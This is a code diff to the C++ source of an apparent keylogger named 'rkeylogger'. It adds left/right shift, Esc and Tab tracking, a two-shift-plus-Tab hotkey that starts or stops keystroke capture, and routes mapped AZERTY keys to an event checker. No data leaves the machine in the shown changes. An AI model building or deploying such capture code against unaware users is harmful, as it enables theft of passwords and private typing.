@@ -3,11 +3,16 @@
 #include <string>
 
 #include "rkeylogger.h"
+#include "event.h"
 
 //TODO: Check the init value with termios.h or something else
 bool
-    is_shift_pressed = false, 
+    is_parsing = false,
+    is_rshift_pressed = false, 
+    is_esc_pressed = false, 
+    is_lshift_pressed = false, 
     is_altgr_pressed = false, 
+    is_tabpressed = false, 
     is_capslock_pressed = false;
 
 // Mapper for basic azerty 
@@ -84,20 +89,22 @@ std::unordered_map<int, KeyValue> keyboard_layout = {
 };
 
 bool emit_code(int code){
-    if(is_capslock_pressed || is_shift_pressed)
-        return save_input(keyboard_layout[code].shift);
+    if(is_capslock_pressed || is_lshift_pressed || is_rshift_pressed)
+        return check_event(keyboard_layout[code].shift);
     if(is_altgr_pressed)
-        return save_input(keyboard_layout[code].altgr);
-    return save_input(keyboard_layout[code].normal);
+        return check_event(keyboard_layout[code].altgr);
+    return check_event(keyboard_layout[code].normal);
 }
 
 MapSaveStatus map_code(int code, int value){
     bool status = value == 1;
-    std::cout << "[ KEY_EVENT ]: code -> " << code << "\n";
-
     switch(code){
         case 1:
-            return MapSaveStatus::END;
+            is_esc_pressed = status;
+            break;
+        case 15:
+            is_tabpressed = status;
+            break;
         case 100:
             is_altgr_pressed = status;
             break;
@@ -105,16 +112,33 @@ MapSaveStatus map_code(int code, int value){
             is_capslock_pressed = status;
             break;
         case 42:
+            is_lshift_pressed = status;
+            break;
         case 54:
-            is_shift_pressed = status;
+            is_rshift_pressed = status;
             break;
         default:
-            if((status && code != 29 && code > 1 && code <= 54) || code == 57){
-                if(!emit_code(code))
+            if( is_parsing && ((status && code != 29 && code >= 1 && code <= 54) || code == 57)){
+                if(!emit_code(code)){
+                    is_parsing = false;
+                    reset_event();
                     return MapSaveStatus::ERROR;
+                }
             }
             break;
     }
 
+    if(is_lshift_pressed && is_rshift_pressed ){
+        reset_event();
+        if(is_tabpressed){
+            is_parsing = !is_parsing;
+            if(is_parsing)
+                std::cout << "[ LOG ]: parsing started" << "\n";
+            else
+                std::cout << "[ LOG ]: parsing stoped" << "\n";
+        }
+        else if(is_esc_pressed)
+            return MapSaveStatus::END;
+    }
     return MapSaveStatus::SUCCESS; 
 }
